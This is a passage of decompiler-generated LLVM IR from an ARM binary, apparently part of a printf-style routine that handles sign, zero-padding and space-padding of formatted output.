  br label %dec_label_pc_db94

dec_label_pc_db88:                                ; preds = %dec_label_pc_db7c
  br i1 %v7_dba8, label %dec_label_pc_db98, label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %.thread84, %bb140, %dec_label_pc_db88
  %v0_dbc086 = phi i32 [ %v5_db74, %.thread84 ], [ %v4_db48, %bb140 ], [ %v4_db48, %dec_label_pc_db88 ]
  br label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db88, %dec_label_pc_db94
  %v0_dbc085 = phi i32 [ %v0_dbc086, %dec_label_pc_db94 ], [ %v4_db48, %dec_label_pc_db88 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_db94 ], [ 6, %dec_label_pc_db88 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_db98 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_db98, i32* %r3.global-to-local, align 4
  %v1_db9c = icmp slt i32 %v3_db98, 0
  %v7_dba0. = select i1 %v1_db9c, i32 %v7_dba0, i32 32
  store i32 %v7_dba0., i32* @sb, align 4
  br i1 %v7_dba8, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_db98
  store i32 %v2_daf4, i32* @lr, align 4
  %v2_dbb0 = load i32, i32* @ip, align 4
  %v5_dbb0 = mul i32 %v2_dbb0, 4
  %v6_dbb0 = add i32 %v5_dbb0, %v2_daf4
  store i32 %v6_dbb0, i32* %r3.global-to-local, align 4
  %v2_dbb4 = add i32 %v6_dbb0, -260
  %v3_dbb4 = inttoptr i32 %v2_dbb4 to i32*
  %v4_dbb4 = load i32, i32* %v3_dbb4, align 4
  store i32 %v4_dbb4, i32* %r3.global-to-local, align 4
  %v2_dbbc = and i32 %v4_dbb4, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_db98, %.thread16
  %storemerge94 = phi i32 [ %v2_dbbc, %.thread16 ], [ 1024, %dec_label_pc_db98 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_dbc085, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_dbc8 = call i32 @function_1197c()
  %v0_dbcc = load i32, i32* @r1, align 4
  store i32 %v0_dbcc, i32* %r2.global-to-local, align 4
  %v0_dbd8 = load i32, i32* @r4, align 4
  store i32 %v0_dbd8, i32* %r3.global-to-local, align 4
  store i32 %v2_dbdc, i32* %r0.global-to-local, align 4
  %v0_dbe0 = load i32, i32* @r5, align 4
  %v6_dbe4 = call i32 @function_11a20(i8* %v5_dbe4, i32 %v0_dbc8, i32 %v0_dbcc, i32 %v0_dbd8, i32 %v0_dbe0)
  store i32 %v6_dbe4, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_dbe4, i32* @r6, align 4
  br i1 %v3_dbf4, label %bb148, label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %bb145
  %v7_dbe4 = inttoptr i32 %v6_dbe4 to i8*
  %v3_dbf8 = load i8, i8* %v7_dbe4, align 1
  %v7_dbfc = icmp eq i8 %v3_dbf8, 45
  %v2_dc04 = or i32 %v0_db68, 2
  %v2_dc04.stack_var_-316.4 = select i1 %v7_dbfc, i32 %v2_dc04, i32 %v0_db68
  store i32 %v2_dc04.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_dbfc, label %.thread18, label %dec_label_pc_dc18

.thread18:                                        ; preds = %dec_label_pc_dbf8
  %v3_dc08 = add i32 %v6_dbe4, 1
  store i32 %v3_dc08, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dbf8
  %v1_dc18 = and i32 %v2_dc04.stack_var_-316.4, 2
  %v2_dc18 = icmp eq i32 %v1_dc18, 0
  br i1 %v2_dc18, label %dec_label_pc_dc24, label %bb146

bb146:                                            ; preds = %dec_label_pc_dc18
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc18
  %v1_dc24 = urem i32 %v2_dc04.stack_var_-316.4, 2
  %v2_dc24 = icmp eq i32 %v1_dc24, 0
  br i1 %v2_dc24, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_dc24
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_dc24, %bb147
  %v0_dc80 = phi i32 [ %v6_dbe4, %bb145 ], [ %v3_dc08, %.thread18 ], [ %v6_dbe4, %dec_label_pc_dc24 ], [ %v6_dbe4, %bb147 ], [ %v6_dbe4, %bb146 ]
  %v0_dc3c = phi i32 [ %v0_db68, %bb145 ], [ %v2_dc04, %.thread18 ], [ %v0_db68, %dec_label_pc_dc24 ], [ %v0_db68, %bb147 ], [ %v0_db68, %bb146 ]
  %v3_dc2c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_dc2c, i32* %r2.global-to-local, align 4
  store i32 %v0_dc3c, i32* %r3.global-to-local, align 4
  %v1_dc34 = icmp slt i32 %v3_dc2c, 0
  br i1 %v1_dc34, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_dc64 = phi i32 [ %v3_dc2c, %bb148 ], [ 1, %bb149 ]
  %v1_dc3c = and i32 %v0_dc3c, 16
  %v2_dc3c = icmp eq i32 %v1_dc3c, 0
  store i32 %v2_de10, i32* %r3.global-to-local, align 4
  %v2_dc44 = sub i32 %v2_de10, %v0_dc80
  %v1_dc48 = add i32 %v2_dc44, 127
  store i32 %v1_dc48, i32* @r5, align 4
  br i1 %v2_dc3c, label %bb157, label %dec_label_pc_dc50

dec_label_pc_dc50:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_dc50
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_dc50, %bb151
  br i1 %v7_dc5c, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_dc64, %v1_dc48
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_dc68, label %dec_label_pc_dc70, label %bb157

dec_label_pc_dc70:                                ; preds = %bb155
  %v1_dc70 = inttoptr i32 %v0_dc80 to i8*
  %v2_dc70 = load i8, i8* %v1_dc70, align 1
  %v3_dc70 = zext i8 %v2_dc70 to i32
  store i32 %v3_dc70, i32* %r3.global-to-local, align 4
  %v7_dc74 = icmp eq i8 %v2_dc70, 48
  br i1 %v7_dc74, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_dc70
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_dc70
  %v2_dc7c = add i32 %v2_dc44, 128
  store i32 %v2_dc7c, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_dcb8 = phi i32 [ %v0_dc64, %bb155 ], [ %v0_dc64, %bb150 ], [ 1, %bb156 ], [ %v2_dc7c, %.thread25 ], [ %v0_dc64, %bb154 ]
  %v1_dc80 = inttoptr i32 %v0_dc80 to i8*
  %v2_dc80 = load i8, i8* %v1_dc80, align 1
  %v3_dc80 = zext i8 %v2_dc80 to i32
  store i32 %v3_dc80, i32* %r3.global-to-local, align 4
  %v7_dc84 = icmp eq i8 %v2_dc80, 48
  br i1 %v7_dc84, label %dec_label_pc_dc8c, label %dec_label_pc_dcb4

dec_label_pc_dc8c:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_dc90 = load i32, i32* @r7, align 4
  %v7_dc94 = icmp slt i32 %v0_dc90, 6
  br i1 %v7_dc94, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_dc8c
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_dc8c, %bb158
  br i1 %v7_dba8, label %.thread26, label %dec_label_pc_dca8

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_16e84.346 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_de28

dec_label_pc_dca8:                                ; preds = %bb159
  %v2_dca8 = icmp eq i32 %v5_dcb8, 0
  br i1 %v2_dca8, label %bb160, label %dec_label_pc_dcb4

bb160:                                            ; preds = %dec_label_pc_dca8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_de28

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dca8, %bb157
  %v2_dcb4 = sub i32 %v5_dcb8, %v1_dc48
  %tmp199 = icmp ugt i32 %v5_dcb8, %v1_dc48
  br i1 %tmp199, label %.thread90, label %dec_label_pc_de28

.thread90:                                        ; preds = %dec_label_pc_dcb4
  store i32 %v2_dcb4, i32* @r4, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_db38
  br i1 %tmp196, label %dec_label_pc_dd00, label %dec_label_pc_dccc

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dcc4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_dcd8 = load i32, i32* @fp, align 4
  store i32 %v0_dcd8, i32* %r0.global-to-local, align 4
  %v2_dcdc = load i32, i32* %v1_db20, align 4
  %v5_dcdc = load i32, i32* %v4_dcdc, align 4
  store i32 %v5_dcdc, i32* %r2.global-to-local, align 4
  store i32 %v2_dce0, i32* %r3.global-to-local, align 4
  %v6_dce4 = call i32 @function_11b70(i32 %v0_dcd8, i32 %v2_dcdc, i32 %v5_dcdc, i32* nonnull %stack_var_-328, i32 55620)
  store i32 %v6_dce4, i32* %r0.global-to-local, align 4
  %v1_dce8 = icmp slt i32 %v6_dce4, 0
  br i1 %v1_dce8, label %dec_label_pc_df94, label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dccc
  %v2_dcf4 = add i32 %v6_dce4, %stack_var_-336.2
  store i32 %v2_dcf4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_df80

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dcc4
  br i1 %v3_dd04, label %dec_label_pc_dda0, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dd00
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_dd00, label %dec_label_pc_dd18, label %dec_label_pc_dd68

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dd08
  %v2_dd18 = load i32, i32* %v1_db20, align 4
  store i32 %v2_dd18, i32* %r3.global-to-local, align 4
  %v9_dd1c = icmp eq i32 %v2_dd18, 0
  store i32 %v2_dd18, i32* %stack_var_-44, align 4
  br i1 %v9_dd1c, label %dec_label_pc_de30, label %dec_label_pc_dd28

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd18
  %v3_dd28 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_dd28, i32* %r3.global-to-local, align 4
  store i32 %v2_dd2c, i32* @r0, align 4
  %v5_dd38 = icmp slt i32 %v3_dd28, -1
  br i1 %v5_dd38, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_dd28
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_dd28, %bb161
  %storemerge193 = phi i32 [ %v3_dd28, %bb161 ], [ -1, %dec_label_pc_dd28 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_dd2c, i32* @r1, align 4
  store i32 %v2_dd40, i32* %r3.global-to-local, align 4
  %v0_dd44 = call i32 @function_11570()
  store i32 %v0_dd44, i32* %r0.global-to-local, align 4
  %v7_dd48 = icmp eq i32 %v0_dd44, -1
  store i32 %v0_dd44, i32* @r5, align 4
  br i1 %v7_dd48, label %dec_label_pc_df94, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %bb162
  %v0_dd54 = load i32, i32* @sl, align 4
  store i32 %v0_dd54, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_dd54, i32* @r6, align 4
  br label %dec_label_pc_de44

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd08
  store i32 %v2_de10, i32* %r8.global-to-local, align 4
  %v2_dd6c = load i32, i32* %v1_db20, align 4
  store i32 %v2_dd40, i32* %r2.global-to-local, align 4
  store i32 %v2_de10, i32* %r0.global-to-local, align 4
  %v3_dd78 = call i32 @function_11520(i32 %v2_de10, i32 %v2_dd6c, i32 %v2_dd40)
  store i32 %v3_dd78, i32* %r0.global-to-local, align 4
  %v7_dd7c = icmp eq i32 %v3_dd78, -1
  store i32 %v3_dd78, i32* @r5, align 4
  br i1 %v7_dd7c, label %dec_label_pc_df94, label %dec_label_pc_dd88

dec_label_pc_dd88:                                ; preds = %dec_label_pc_dd68
  %v0_dd88 = load i32, i32* @sl, align 4
  store i32 %v0_dd88, i32* @r4, align 4
  store i32 %v2_de10, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_dd98 = trunc i32 %v0_dd88 to i8
  %v2_dd98 = load i32, i32* %r8.global-to-local, align 4
  %v4_dd98 = add i32 %v2_dd98, %v3_dd78
  %v5_dd98 = inttoptr i32 %v4_dd98 to i8*
  store i8 %v1_dd98, i8* %v5_dd98, align 1
  %v0_de48.pre.pre = load i32, i32* @r5, align 4
  %v1_de48.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd00
  br i1 %v3_dda4, label %dec_label_pc_de04, label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dda0
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_ddb0 = load i32, i32* %v1_db20, align 4
  br i1 %v7_dda0, label %dec_label_pc_ddb0, label %dec_label_pc_dddc

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dda8
  store i32 %v2_ddb0, i32* @r6, align 4
  %v2_ddb4 = icmp eq i32 %v2_ddb0, 0
  br i1 %v2_ddb4, label %dec_label_pc_de30, label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddb0, %dec_label_pc_de0c
  %v0_ddcc = phi i32 [ %v2_ddb0, %dec_label_pc_ddb0 ], [ %v3_de1c, %dec_label_pc_de0c ]
  %v3_ddbc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_ddbc, i32* %r3.global-to-local, align 4
  %v5_ddc8 = icmp slt i32 %v3_ddbc, -1
  br i1 %v5_ddc8, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_ddbc
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_ddbc, %bb163
  %storemerge194 = phi i32 [ %v3_ddbc, %bb163 ], [ -1, %dec_label_pc_ddbc ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_ddcc, i32* %r0.global-to-local, align 4
  %v1_ddd0 = inttoptr i32 %v0_ddcc to i8*
  %v2_ddd0 = call i32 @function_f288(i8* %v1_ddd0)
  store i32 %v2_ddd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_de38

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dda8
  store i32 %v2_ddb0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_de10, i32* @r6, align 4
  store i32 %v2_ddb0, i32* %stack_var_-180, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_de04:                                ; preds = %dec_label_pc_dda0
  br i1 %v7_de04, label %dec_label_pc_de0c, label %dec_label_pc_df94

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de04
  %v0_de0c = call i32 @function_cec4()
  store i32 %v0_de0c, i32* %r0.global-to-local, align 4
  %v1_de14 = inttoptr i32 %v0_de0c to i32*
  %v2_de14 = load i32, i32* %v1_de14, align 4
  store i32 %v2_de14, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_de1c = call i32 @function_f368(i32 %v2_de14, i32 %v2_de10, i32 128)
  store i32 %v3_de1c, i32* %r0.global-to-local, align 4
  store i32 %v3_de1c, i32* @r6, align 4
  br label %dec_label_pc_ddbc

dec_label_pc_de28:                                ; preds = %dec_label_pc_dcb4, %.thread26, %bb160
  %v0_de48.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_dc48, %dec_label_pc_dcb4 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_de44thread-pre-split

dec_label_pc_de30:                                ; preds = %dec_label_pc_dd18, %dec_label_pc_ddb0
  store i32 ptrtoint ([7 x i8]* @global_var_16e8c.349 to i32), i32* @r6, align 4
  br label %dec_label_pc_de38

dec_label_pc_de38:                                ; preds = %bb164, %dec_label_pc_de30
  %storemerge = phi i32 [ 6, %dec_label_pc_de30 ], [ %v2_ddd0, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_de44

dec_label_pc_de44thread-pre-split:                ; preds = %.thread90, %dec_label_pc_dddc, %dec_label_pc_de28, %dec_label_pc_dd88
  %v1_de48.pre = phi i32 [ 0, %dec_label_pc_de28 ], [ %v1_de48.pre.pre, %dec_label_pc_dd88 ], [ 0, %dec_label_pc_dddc ], [ %v2_dcb4, %.thread90 ]
  %v0_de48.pre = phi i32 [ %v0_de48.pre81, %dec_label_pc_de28 ], [ %v0_de48.pre.pre, %dec_label_pc_dd88 ], [ 1, %dec_label_pc_dddc ], [ %v1_dc48, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_dc3c, %dec_label_pc_de28 ], [ %v0_db68, %dec_label_pc_dd88 ], [ %v0_db68, %dec_label_pc_dddc ], [ %v0_dc3c, %.thread90 ]
  %v0_de44.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de44thread-pre-split, %dec_label_pc_dd54, %dec_label_pc_de38
  %v1_de84 = phi i32 [ %v1_de48.pre, %dec_label_pc_de44thread-pre-split ], [ %v0_dd54, %dec_label_pc_dd54 ], [ 0, %dec_label_pc_de38 ]
  %v0_de48 = phi i32 [ %v0_de48.pre, %dec_label_pc_de44thread-pre-split ], [ %v0_dd44, %dec_label_pc_dd54 ], [ %storemerge, %dec_label_pc_de38 ]
  %v0_de50 = phi i32 [ %v0_de44.pr, %dec_label_pc_de44thread-pre-split ], [ 11, %dec_label_pc_dd54 ], [ 11, %dec_label_pc_de38 ]
  %v0_de8c = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_de44thread-pre-split ], [ %v0_db68, %dec_label_pc_dd54 ], [ %v0_db68, %dec_label_pc_de38 ]
  %v7_de44 = icmp eq i32 %v0_de50, 11
  %v2_de48 = add i32 %v0_de48, %v1_de84
  br i1 %v7_de44, label %dec_label_pc_de60, label %bb165

bb165:                                            ; preds = %dec_label_pc_de44
  %v7_de58 = icmp sgt i32 %v0_de50, 5
  %. = select i1 %v7_de58, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_de5c = add i32 %., %v2_de48
  br label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de44, %bb165
  %v0_de74 = phi i32 [ %v2_de48, %dec_label_pc_de44 ], [ %v2_de5c, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_de64 = sub i32 %tmp97, %v0_de74
  %v3_de64 = icmp uge i32 %tmp97, %v0_de74
  %v9_de64 = icmp eq i32 %tmp97, %v0_de74
  %v2_de68 = xor i1 %v3_de64, true
  %v3_de68 = or i1 %v9_de64, %v2_de68
  br i1 %v3_de68, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_de60
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_de60, %bb166
  %v2_de6c = xor i1 %v9_de64, true
  %v3_de6c = and i1 %v3_de64, %v2_de6c
  br i1 %v3_de6c, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_de74.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_de64, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_de84 = phi i32 [ %v1_de74.pre, %._crit_edge ], [ %v2_de64, %bb168 ]
  %v2_de74 = add i32 %v0_de74, %stack_var_-336.2
  %v2_de78 = add i32 %v2_de74, %v2_de84
  store i32 %v2_de78, i32* @ip, align 4
  store i32 %v0_de8c, i32* %r3.global-to-local, align 4
  %v0_de80 = load i32, i32* @sb, align 4
  %v7_de80 = icmp eq i32 %v0_de80, 48
  br i1 %v7_de80, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_de84 = add i32 %v2_de84, %v1_de84
  store i32 %v3_de84, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_dea0 = phi i32 [ %v2_de84, %bb169 ], [ 0, %bb170 ]
  %v1_de8c = and i32 %v0_de8c, 8
  store i32 %v1_de8c, i32* @r8, align 4
  %v2_de8c = icmp eq i32 %v1_de8c, 0
  br i1 %v2_de8c, label %dec_label_pc_de98, label %dec_label_pc_deb4

dec_label_pc_de98:                                ; preds = %.thread29
  %v0_de98 = load i32, i32* @fp, align 4
  store i32 %v0_de98, i32* %r0.global-to-local, align 4
  store i32 %v0_dea0, i32* %r2.global-to-local, align 4
  %v4_dea4 = call i32 @function_d8f8(i32 %v0_de98, i8 32, i32 %v0_dea0)
  store i32 %v4_dea4, i32* %r0.global-to-local, align 4
  %v1_dea8 = load i32, i32* @sl, align 4
  %v9_dea8 = icmp eq i32 %v4_dea4, %v1_dea8
  br i1 %v9_dea8, label %dec_label_pc_deb0, label %dec_label_pc_df94

dec_label_pc_deb0:                                ; preds = %dec_label_pc_de98
  %v0_deb0 = load i32, i32* @r8, align 4
  store i32 %v0_deb0, i32* @sl, align 4
  %v0_debc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %.thread29, %dec_label_pc_deb0
  %v0_debc = phi i32 [ %v0_de50, %.thread29 ], [ %v0_debc.pre, %dec_label_pc_deb0 ]
  %v0_deb8 = load i32, i32* @fp, align 4
  %v2_debc = add i32 %v0_debc, ptrtoint (i32* @global_var_16e94.351 to i32)
  store i32 %v2_debc, i32* %r0.global-to-local, align 4
  %v2_dec0 = call i32 @function_ee68(i32 %v2_debc, i32 %v0_deb8)
  %v0_dec4 = load i32, i32* @fp, align 4
  store i32 %v0_dec4, i32* %r0.global-to-local, align 4
  %v0_decc = load i32, i32* @r4, align 4
  store i32 %v0_decc, i32* %r2.global-to-local, align 4
  %v4_ded0 = call i32 @function_d8f8(i32 %v0_dec4, i8 48, i32 %v0_decc)
  store i32 %v4_ded0, i32* %r0.global-to-local, align 4
  %v1_ded4 = load i32, i32* @r4, align 4
  %v9_ded4 = icmp eq i32 %v4_ded0, %v1_ded4
  br i1 %v9_ded4, label %dec_label_pc_dedc, label %dec_label_pc_df94

dec_label_pc_dedc:                                ; preds = %dec_label_pc_deb4
  %v3_dedc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dedc, i32* %r3.global-to-local, align 4
  %v2_dee0 = icmp eq i32 %v3_dedc, 0
  br i1 %v2_dee0, label %dec_label_pc_def0, label %dec_label_pc_df50thread-pre-split

dec_label_pc_def0:                                ; preds = %dec_label_pc_dedc
  %v0_def0 = load i32, i32* @r5, align 4
  %v2_def0 = icmp eq i32 %v0_def0, 0
  br i1 %v2_def0, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_def0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_def0
  %v1_def8 = load i32, i32* @r6, align 4
  store i32 %v1_def8, i32* %r0.global-to-local, align 4
  %v1_df00 = load i32, i32* @fp, align 4
  store i32 %v1_df00, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 57096, i32* @lr, align 4
  %v1_df04 = xor i1 %v2_def0, true
  call void @__pseudo_cond_branch(i1 %v1_df04, i32 ptrtoint (i32* @global_var_11740.342 to i32))
  %v0_df08 = load i32, i32* %r0.global-to-local, align 4
  %v1_df08 = load i32, i32* @r5, align 4
  %v9_df08 = icmp eq i32 %v0_df08, %v1_df08
  br i1 %v9_df08, label %dec_label_pc_df68, label %dec_label_pc_df94

dec_label_pc_df14:                                ; preds = %dec_label_pc_df50
  %v2_df14 = icmp ult i32 %v1_df18, 128
  %.v1_df18 = select i1 %v2_df14, i32 %v1_df18, i32 128
  store i32 %.v1_df18, i32* @r2, align 4
  %v0_df20 = call i32 @function_11570()
  store i32 %v0_df20, i32* @r4, align 4
  %v2_df24 = icmp eq i32 %v0_df20, 0
  store i32 %v0_df20, i32* %r3.global-to-local, align 4
  store i32 %v2_de10, i32* %r0.global-to-local, align 4
  %v0_df34 = load i32, i32* @fp, align 4
  store i32 %v0_df34, i32* %r2.global-to-local, align 4
  br i1 %v2_df24, label %dec_label_pc_df44, label %dec_label_pc_df3c

dec_label_pc_df3c:                                ; preds = %dec_label_pc_df14
  %v3_df3c = call i32 @function_11740(i32 %v2_de10, i32 %v0_df20, i32 %v0_df34)
  store i32 %v3_df3c, i32* %r0.global-to-local, align 4
  store i32 %v3_df3c, i32* %r3.global-to-local, align 4
  %v1_df44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_df44

dec_label_pc_df44:                                ; preds = %dec_label_pc_df14, %dec_label_pc_df3c
  %v1_df44 = phi i32 [ 0, %dec_label_pc_df14 ], [ %v1_df44.pre, %dec_label_pc_df3c ]
  %v0_df48 = phi i32 [ 0, %dec_label_pc_df14 ], [ %v3_df3c, %dec_label_pc_df3c ]
  %v9_df44 = icmp eq i32 %v0_df48, %v1_df44
  %v1_df48 = load i32, i32* @r5, align 4
  %v2_df48 = sub i32 %v1_df48, %v0_df48
  store i32 %v2_df48, i32* @r5, align 4
  br i1 %v9_df44, label %dec_label_pc_df50, label %dec_label_pc_df94

dec_label_pc_df50thread-pre-split:                ; preds = %dec_label_pc_dedc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_df54.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_df50

dec_label_pc_df50:                                ; preds = %dec_label_pc_df50thread-pre-split, %dec_label_pc_df44
  %v1_df18 = phi i32 [ %v0_df54.pr, %dec_label_pc_df50thread-pre-split ], [ %v2_df48, %dec_label_pc_df44 ]
  store i32 %v2_de10, i32* @r6, align 4
  %v2_df54 = icmp eq i32 %v1_df18, 0
  store i32 %v2_dd2c, i32* @r1, align 4
  store i32 %v2_dd40, i32* %r3.global-to-local, align 4
  store i32 %v2_de10, i32* @r0, align 4
  br i1 %v2_df54, label %dec_label_pc_df68, label %dec_label_pc_df14

dec_label_pc_df68:                                ; preds = %dec_label_pc_df50, %.thread36
  %v0_df68 = load i32, i32* @fp, align 4
  store i32 %v0_df68, i32* %r0.global-to-local, align 4
  %v0_df70 = load i32, i32* @sl, align 4
  store i32 %v0_df70, i32* %r2.global-to-local, align 4
  %v4_df74 = call i32 @function_d8f8(i32 %v0_df68, i8 32, i32 %v0_df70)
  store i32 %v4_df74, i32* %r0.global-to-local, align 4
  %v1_df78 = load i32, i32* @sl, align 4
  %v9_df78 = icmp eq i32 %v4_df74, %v1_df78
  br i1 %v9_df78, label %dec_label_pc_df80, label %dec_label_pc_df94

dec_label_pc_df80:                                ; preds = %dec_label_pc_df68, %dec_label_pc_dcf0, %dec_label_pc_db14
  %stack_var_-316.3 = phi i32 [ %v0_db68, %dec_label_pc_db14 ], [ %v0_de8c, %dec_label_pc_df68 ], [ %v0_db68, %dec_label_pc_dcf0 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_db14 ], [ %v2_de78, %dec_label_pc_df68 ], [ %v2_dcf4, %dec_label_pc_dcf0 ]
  %v3_df80 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_df80, i32* @r4, align 4
  br label %dec_label_pc_df84

dec_label_pc_df84:                                ; preds = %dec_label_pc_da24, %dec_label_pc_df80
  %v0_df84 = phi i32 [ %v0_df84.pre, %dec_label_pc_da24 ], [ %v3_df80, %dec_label_pc_df80 ]
  %v0_db68 = phi i32 [ %tmp100, %dec_label_pc_da24 ], [ %stack_var_-316.3, %dec_label_pc_df80 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_da24 ], [ %stack_var_-336.3, %dec_label_pc_df80 ]
  store i32 %v0_df84, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_da3c.outer

dec_label_pc_da3c.outer:                          ; preds = %dec_label_pc_df8c, %dec_label_pc_df84
  %v5_da68 = phi i32 [ %v1_da98, %dec_label_pc_df8c ], [ %v0_df84, %dec_label_pc_df84 ]
  %v0_da3c49 = phi i32 [ %v1_df8c, %dec_label_pc_df8c ], [ %v0_df84, %dec_label_pc_df84 ]
